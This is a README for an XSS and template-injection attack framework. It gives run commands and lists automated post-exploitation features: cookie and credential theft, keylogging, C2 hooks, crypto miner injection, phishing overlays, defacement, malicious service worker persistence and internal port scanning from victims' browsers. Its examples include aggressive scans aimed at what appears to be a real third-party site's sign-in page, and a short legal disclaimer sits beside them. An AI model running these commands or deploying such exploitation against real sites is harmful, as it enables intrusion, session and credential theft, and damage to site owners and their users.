# XSS ULTIMATE v3.0

Next-Generation AI-Enhanced XSS Detection, Exploitation & Post-Exploitation Framework.

Actively tests a target for **all XSS types**: Reflected, Stored/Blind, DOM-based, **Client-Side/Browser-Side** (WebSockets, Service Workers, Web Workers, postMessage, IndexedDB, Web Storage, Mutation Observers, Prototype Pollution, DOM Clobbering, WebAssembly, WebGPU/WebGL, Browser Extensions), **Server-Side Template Injection (SSTI)**, and **Client-Side Template Injection**. Auto-detects injection context, leverages AI for intelligent payload generation, and on confirmed vulnerabilities proceeds to advanced post-exploitation with C2 capabilities.

> **LEGAL**: For authorized security testing only. Only scan systems you own or have explicit written permission to test. Unauthorized scanning may violate applicable laws.

---

## Installation

```bash
pip install requests beautifulsoup4
# Optional for browser-execution verification:
pip install playwright && playwright install chromium
# Optional for AI-powered analysis:
pip install requests  # Groq API client uses requests
```

## Quick Start

```bash
# Basic scan
python -m xss_ultimate.main --url "http://target/page.php?q=test"

# Full aggressiveness: stealth + WAF evasion + geo-spoofing
python -m xss_ultimate.main --url "http://target" --stealth --aggressive-waf --geo-spoof

# With external collab server for blind XSS
python -m xss_ultimate.main --url "http://target" --collab "http://your-collab-server.com"

# Full auto-exploitation + PoC generation
python -m xss_ultimate.main --url "http://target" --post-exploit --generate-poc

# Maximum aggression: exploit with destructive/persistent/C2 techniques + PoC
python -m xss_ultimate.main --url "http://target" --post-exploit --aggressive-exploit --generate-poc

# AI-ENHANCED: Enable Groq AI for intelligent payload generation and injection analysis
python -m xss_ultimate.main --url "http://target" --enable-ai --groq-key YOUR_GROQ_API_KEY --post-exploit --aggressive-exploit --generate-poc

# Quick smoke test against the bundled vulnerable server
python test_site/server.py          # terminal 1
python -m xss_ultimate.main --url "http://127.0.0.1:8089/?search=test" --max-payloads 8

# Save reports to a custom directory with verbose per-finding details
python -m xss_ultimate.main --url "http://target" --results-dir test_results --verbose
```

Run unit tests: `python test_scanner.py`

---

## Testing a Real Site

### Find real input pages first
The scanner can only find XSS where there is actually user input to test, and it can only crawl pages it can discover from the URL you give it. If you scan a bare homepage (e.g. `http://site.com/?search=test`) and the report says **0 forms, 0 JS files**, that page simply has no input for the scanner to work with — the tool is working correctly, not missing anything.

Browse the site like a normal user and look for pages with real input, then point the scanner at them directly:

- Search pages: `http://site.com/search?q=test`
- **Login / sign-in pages** — `http://site.com/signin`, `http://site.com/login` (a very common XSS spot, because apps reflect error messages like `Invalid username: <payload>`)
- Registration, "forgot password", contact, and comment forms
- Profile/settings pages that store and re-render your own input (stored XSS)

Example targeting a login page:

```bash
python -m xss_ultimate.main --url "http://nacosogitech.com.ng/signin" --verbose --max-payloads 5
```

### What the scanner does on a login page
- **Phase 1** fetches the page and extracts the `<form>` (username + password inputs).
- **Phase 2** POSTs payloads into those fields and looks for reflection in the response (e.g. the "invalid username" error message).
- **Phase 3** submits stored/blind payloads into the form in case values get persisted.
- **Phase 4** scans the page's JS for DOM sinks.
- **Phase 4B** tests client-side sinks: WebSockets, Service Workers, Web Workers, postMessage, IndexedDB, localStorage/sessionStorage, Mutation Observers, Prototype Pollution, DOM Clobbering.
- **Phase 3B** tests Server-Side Template Injection (SSTI) on all injection points.

With full exploitation:

```bash
python -m xss_ultimate.main --url "http://nacosogitech.com.ng/signin" \
  --post-exploit --aggressive-exploit --generate-poc --results-dir test_results
```

### Verify the scanner actually found the form
Run with `--verbose`. If you see something like:

```
Testing FORM POST http://site.com/signin
    Params: username, password
```

the form was detected and is being tested. If the form line never appears, the page is JS-rendered (SPA) or the form needs interaction — install the optional browser support so DOM sinks can be checked:

```bash
pip install playwright && playwright install chromium
```

### Known limitations
- **CSRF tokens / 2-step login flows**: many login forms require a hidden token, so test POSTs may just return "invalid credentials" and never reflect anything. This is a limitation of the tool, not a false negative on the site.
- **Single-page apps (React/Vue/Angular)**: content rendered client-side is invisible to the simple spider; install Playwright and target routes that accept input directly (e.g. `/#/search?q=test`).
- **No findings is expected** on sites that don't reflect input. Try other URLs, other params, and `--stealth --aggressive-waf --max-payloads --enable-ai` before concluding the site is clean.

> **LEGAL**: Only test sites you own or have explicit written permission to scan.

---

## Architecture

Modular package under `xss_ultimate/`; `xss_ultimate/main.py` is the main entry point.

```
xss_ultimate/
├── main.py                     # Orchestrator — runs all 6 phases
├── config.py                   # Constants (payload caps, sinks, headers, frameworks, Groq AI config)
├── utils.py                    # Session, headers, encoding/CSP/framework detection, reports
├── spider.py                   # PHASE 1 — crawling, forms, params, JS/AJAX discovery
├── js_analyzer.py              # PHASE 1 — DOM sink/source extraction from JS
├── payload_engine.py           # Reflected/Blind/DOM/Client-side payloads + variant generation + AI-enhanced
├── waf_bypass.py               # 13+ WAF/input-filter evasion techniques
├── response_analyzer.py        # Context detection, reflection scoring, WAF detection
├── reflected.py                # PHASE 2 — Reflected + header XSS testing (AI-integrated)
├── stored.py                   # PHASE 3 — Stored + Blind XSS testing
├── collab_server.py            # PHASE 3 — built-in Burp-Collaborator-style OOB server
├── dom_xss.py                  # PHASE 4 — DOM-based XSS source→sink testing
├── clientside_xss.py           # PHASE 4B — Client-Side/Browser-Side XSS (WebSockets, SW, WW, postMessage, IDB, WS, Mutation, ProtoPollution, DOM Clobbering, CSTI, WASM, WebGPU, Extensions)
├── post_exploit.py             # PHASE 5 (Legacy) — automatic exploitation payload generation
├── advanced_post_exploit.py    # PHASE 5 — ADVANCED: BeEF hook, WebSocket C2, SW persistence, storage poisoning, clickjacking, port scan, internal scan, phishing, crypto miner, defacement
├── headless_verifier.py        # Browser-execution confirmation (Playwright/Selenium)
├── ai_integration.py           # AI Integration — Groq API client, injection analyzer, payload engine, response analyzer
└── ssti_tester.py              # PHASE 3B — Server-Side Template Injection testing (in clientside_xss.py)
```

---

## Scan Modes & Workflow

### Phase 1 — Reconnaissance & Attack Surface Mapping
- Full-site spidering: pages, forms, query params, POST bodies, headers, cookies, AJAX endpoints.
- Sink extraction from every JS file: `innerHTML`, `outerHTML`, `document.write`, `eval`, `setTimeout`/`setInterval`(string), `insertAdjacentHTML`, jQuery `.html()`/`.append()`, location methods, `postMessage`.
- Source extraction: `location.*`, `document.URL`, `document.referrer`, `window.name`, `document.cookie`, `sessionStorage`/`localStorage`, `history.state`.
- Detects page encoding, framework (React/Angular/Vue/jQuery/Svelte/Next/Nuxt/Gatsby), and CSP policy (with bypass observations).
- **AI Enhancement**: If `--enable-ai` with Groq API key, Groq analyzes the entire attack surface and prioritizes injection points with context-aware reasoning, estimated success rates, and WAF evasion strategies.

### Phase 2 — Reflected XSS Testing (AI-Enhanced)
- Multi-layer encoding: plain, URL-encode, double-URL-encode, HTML-entity, unicode/hex escapes, UTF-8 overlong, null bytes, mixed case.
- Context-aware payloads: HTML / attribute / JavaScript / URL / CSS contexts auto-detected.
- 13+ WAF/input-filter bypass techniques (comments, case, hex/unicode, entities, tab/newline, null-byte, overlong UTF-8, nested encoding, unicode-case homoglyphs).
- GET + POST, hidden fields, header injection (Referer, User-Agent, X-Forwarded-For, Cookie).
- Parameter fuzzing and discovery of common parameter names.
- Reflection detection with confidence scoring; optional headless-browser execution proof.
- **AI Enhancement**: Groq generates context-specific payloads per injection point, learns from failures, and analyzes responses for subtle reflection patterns traditional regex misses.

### Phase 3 — Stored / Blind XSS Testing
- Discovers persistent surfaces: comments, profiles, message boards, contact forms, reviews, settings.
- Submits multi-family payloads and re-fetches to confirm stored reflection.
- **Blind XSS** via a built-in OOB interaction server (like Burp Collaborator / interactsh): payloads fire image/fetch/WebSocket/EventSource callbacks carrying `document.cookie`, page content, localStorage, etc. The tool listens for inbound hits and reports which payload executed where.
- Covers admin-side blind XSS (payloads that fire when an admin views the content).

### Phase 3B — Server-Side Template Injection (SSTI)
- Tests all injection points for SSTI across 15+ template engines: Jinja2, Twig, Freemarker, Velocity, Mako, ERB, Thymeleaf, Smarty, Java/Spring, Tornado, Dust, Nunjucks, Handlebars, Pug/Jade, EJS.
- Payloads for code execution, file read, and blind OOB exfiltration.
- Detects engine-specific syntax and confirms via mathematical operations (e.g., `{{7*7}}` → `49`).

### Phase 4 — DOM-Based XSS Testing
- Static JS taint map: every source connected to every sink.
- Payloads injected via fragment and query param across all discovered URLs.
- Angular `{{...}}` expression and Vue template injection probes.
- Sink-accurate reporting (which sink each payload can reach).

### Phase 4B — Client-Side / Browser-Side XSS Testing (NEW)
- **WebSocket Endpoints**: Tests `ws://`/`wss://` URLs for message reflection and injection.
- **Service Workers**: Tests `navigator.serviceWorker.register()` sinks for payload injection.
- **Web Workers**: Tests `new Worker()` / `Worker.postMessage()` for code execution.
- **postMessage**: Tests `window.postMessage` / `addEventListener('message')` for origin validation bypass and data exfiltration.
- **IndexedDB**: Tests `indexedDB.open/put/get` for stored XSS via database poisoning.
- **Web Storage**: Tests `localStorage`/`sessionStorage` setter/getter sinks.
- **Mutation XSS**: Tests `MutationObserver` sinks with `<details ontoggle>`, `<marquee onstart>`, `<video><source onerror>`, etc.
- **Prototype Pollution**: Tests `__proto__` / `constructor.prototype` / `Object.assign` / `_.merge` / `jQuery.extend` sinks leading to XSS via `srcdoc`, `innerHTML`, etc.
- **DOM Clobbering**: Tests named DOM access (`document.cookie`, `window.location`, `document.config`) clobbered by HTML elements.
- **Client-Side Template Injection**: Tests Handlebars, Mustache, Lodash, Underscore, doT, EJS, Pug, Vue, React, Angular client-side template sinks.
- **WebAssembly**: Tests `WebAssembly.instantiate` / `WebAssembly.Memory` sinks.
- **WebGPU/WebGL**: Tests `navigator.gpu.requestAdapter` / `canvas.getContext('webgl')` sinks.
- **Browser Extensions**: Tests `chrome.runtime.sendMessage` / `browser.runtime.sendMessage` / `chrome.tabs.executeScript` sinks.

### Phase 5 — Advanced Post-Exploitation (auto, on confirmed XSS)
Runs on every confirmed vulnerability and delivers the full payload set across **multiple vectors** (GET params, POST body, URL fragment, Referer/User-Agent header). Delivered techniques are then **verified against the OOB callback server** — inbound hits are mapped back to the exact exploit that fired.

**Core techniques** (delivered with `--post-exploit`):
- **Session hijacking** — cookie theft (Image/Fetch/Beacon), session/token fixation, session-hijack PoC generation.
- **Content theft** — full DOM HTML, localStorage/sessionStorage, CSRF token grab.
- **Keystroke logging** — char-by-char with periodic batched exfil.
- **Form grabbing + auto credential grabber** — captures submitted credentials (incl. login forms added dynamically).
- **Clipboard theft** — harvest copied text.
- **postMessage hijack** — intercepts cross-window messages.
- **Activity/telemetry tracker** — click coordinates + clicked-element HTML, window focus events.
- **Screenshots** — canvas-based full-page capture (via html2canvas).
- **Full-chain exfil** — one payload does everything: cookie + storage + fingerprint + keylogger + form grab + clipboard + fetch/XHR interception.
- **BeEF-style Hook** — persistent C2 channel with heartbeat, command execution, click/key/form logging.
- **WebSocket C2** — bidirectional command & control over WebSocket.

**Aggressive techniques** (additional with `--aggressive-exploit`, use with permission):
- **Page defacement** — replaces the page content and notifies the attacker.
- **Crypto miner injection** — loads an attacker-hosted miner script.
- **Internal network + port scanning** — probes internal IPs and localhost ports from the victim's browser.
- **History sniffing** — detects visited internal/admin URLs.
- **Phishing overlay** — in-page "session expired" fake-login capture.
- **Storage poisoning** — persists attacker-controlled values in localStorage/sessionStorage/IndexedDB for future visits.
- **Clickjacking iframe overlay** — transparent attacker iframe over the whole page.
- **Service Worker Persistence** — registers a malicious SW that intercepts all fetches and injects payloads on every page load.
- **DOM Clobbering exploitation** — leverages clobbered globals for XSS.
- **Prototype Pollution RCE** — pollutes `Object.prototype` to achieve code execution.

The resulting PoC (`--generate-poc`) includes a full **Exploitation Results** section listing every technique attempted, delivered, and confirmed via callback.

---

## CLI Reference

| Flag | Description |
|------|-------------|
| `--url URL` | Target URL (required) |
| `--timeout N` | Request timeout seconds (default 15) |
| `--delay N` | Delay between requests (default 0.2) |
| `--proxy URL` | Route through proxy (e.g. Burp `http://127.0.0.1:8080`) |
| `--stealth` | Random delays + rotating headers |
| `--aggressive-waf` | Per-request header randomization + adaptive backoff |
| `--geo-spoof` | Geo-spoofing headers |
| `--collab URL` | External OOB collab URL (skips built-in server) |
| `--collab-port N` | Built-in collab server port (default 9999) |
| `--blind-wait N` | Seconds to wait for blind XSS/SSTI callbacks (default 30) |
| `--max-pages N` | Max pages to crawl (default 50) |
| `--max-payloads N` | Limit payloads per point (0 = all) |
| `--results-dir PATH` | Directory for scan reports (default `scan_results`) |
| `--verbose` | Extra detail per finding (trigger URL, injected params) |
| `--post-exploit` | Enable automatic post-exploitation (core exfil + capture techniques) |
| `--aggressive-exploit` | Add destructive/persistent/C2 techniques (defacement, crypto miner, port scan, phishing, storage poisoning, clickjacking, service worker persistence, BeEF hook, WebSocket C2) |
| `--generate-poc` | Generate HTML PoC file (includes exploitation results + confirmed callbacks) |
| `--enable-ai` | Enable AI-powered analysis (requires Groq API key) |
| `--groq-key KEY` | Groq API key for AI integration |
| `--groq-model MODEL` | Groq model to use (default: `mixtral-8x7b-32768`) |

Reports are written to `scan_results/<domain>_<timestamp>.json` and `.html` (or the directory given by `--results-dir`).

---

## AI Integration (Groq)

When `--enable-ai --groq-key YOUR_KEY` is provided:

1. **Injection Point Analysis**: Groq analyzes the complete attack surface (forms, URLs, JS files, AJAX endpoints, parameters) and returns prioritized injection candidates with context, reasoning, payload strategy, and WAF evasion plan.

2. **Smart Payload Generation**: For each injection point, Groq generates custom payloads tailored to the detected context (HTML/attribute/JS/URL/CSS/template), target framework (React/Vue/Angular/Svelte/Next/Nuxt), WAF fingerprints, CSP policy, and previous failures.

3. **Response Analysis**: Groq analyzes HTTP responses for subtle reflection patterns, encoded variations, DOM sink reachability, CSP violations, and framework-specific rendering quirks that regex-based detection misses.

4. **Post-Exploitation Planning**: Groq designs advanced exploitation chains including persistence, C2 establishment, lateral movement (SSRF via XSS), credential harvesting, and data exfiltration strategies.

Configure via `xss_ultimate/config.py`:
```python
GROQ_API_KEY = "your-key-here"
GROQ_MODEL = "mixtral-8x7b-32768"
GROQ_BASE_URL = "https://api.groq.com/openai/v1"
ENABLE_AI = True
AI_MAX_REQUESTS = 50
AI_TEMPERATURE = 0.3
AI_MAX_TOKENS = 4000
```

---

## Verification

```bash
python test_scanner.py        # Unit tests across all modules

# End-to-end smoke test: detect + aggressively exploit the bundled vulnerable server
python test_site/server.py              # terminal 1 — starts on http://127.0.0.1:8089
python -m xss_ultimate.main --url "http://127.0.0.1:8089/?search=test" \
  --post-exploit --aggressive-exploit --generate-poc --results-dir test_results
# -> open test_results/poc_*.html for the exploitation report
```

The bundled `test_site/server.py` is a deliberately vulnerable target for testing the scanner end-to-end (reflected, stored, blind, DOM, client-side, SSTI).

---

## File Cleanup

The following legacy/duplicate files have been removed or consolidated:
- `xss_ultimate.py` — replaced by `xss_ultimate/main.py`
- `xssscan.py` — legacy entry point, use `python -m xss_ultimate.main`
- `xss_ultimate/__main__.py` — legacy entry point
- `payload2.txt`, `payloads_aggressive.txt` — superseded by `payload_engine.py`
- `generate_sample_results.py`, `question.txt`, `tempCodeRunnerFile.python` — test artifacts
- `ENHANCEMENTS.md`, `CHANGES.md`, `FIX_SUMMARY.md`, `UPGRADE_COMPLETE.md`, `SOLUTION.md`, `QUICK_REFERENCE.md`, `QUICKSTART.md`, `START_HERE.md`, `INDEX.md`, `WAF_EVASION.md`, `TROUBLESHOOTING_GUIDE.md` — documentation consolidated into this README
- `EXAMPLES.md` — examples included in CLI Reference above